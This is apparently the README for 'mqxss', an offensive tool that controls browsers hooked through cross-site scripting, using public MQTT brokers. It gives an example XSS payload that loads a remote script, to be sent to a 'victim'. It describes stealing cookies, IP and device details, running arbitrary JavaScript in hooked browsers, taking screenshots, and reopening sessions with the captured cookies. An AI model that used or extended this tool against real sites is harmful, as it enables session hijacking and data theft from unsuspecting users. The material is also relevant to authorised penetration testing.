# mqxss


**mqxss acts as a client to communicate with hooked browsers over MQTT**

I created this without a lot of bells and whistles so that the user could send raw JS to the hooked browser.  The benefit to using this over beef or xsshunter is that there is no infra setup, you can use a public broker (however currently uses obfuscation, encryption is in the works).

Hooked browsers will communicate in the MQTT topic on the broker you specify, there are many public/free brokers to test this with.

To generate a JS payload to hook browsers with set the -g flag at runtime along with your broker, port and topic variables.  Doing so will create your payload in the /js/ folder.

Then send your XSS payload to the victim while the mqxss client is running, ex: '"><script src=https://example.com/x.js></script> or something similar, if vulnerable you should get a notification saying the browser has connected with some basic details including cookies etc.

**Features:**

- **currently only works with mqtt brokers that use secure websockets however future version will supports mqtts as well.**
- **open hooked browser location with captured cookies**
- **when hooked it grabs cookies, ip, device type, user agent**
- **view past hooked (unhooked) browsers**
- **send js to currently hooked browsers and get response if available**
- **pushover notification**
- **screenshot of hooked browser**

**Todo:**

- [ ] Encryption (currently just obfuscated)
- [ ] Set user , passwordÂ  for brokers that require it at runtime
- [x] Generate js payload at runtime to hook browsers with
- [x] Open browser with hooked browser cookies for convenience
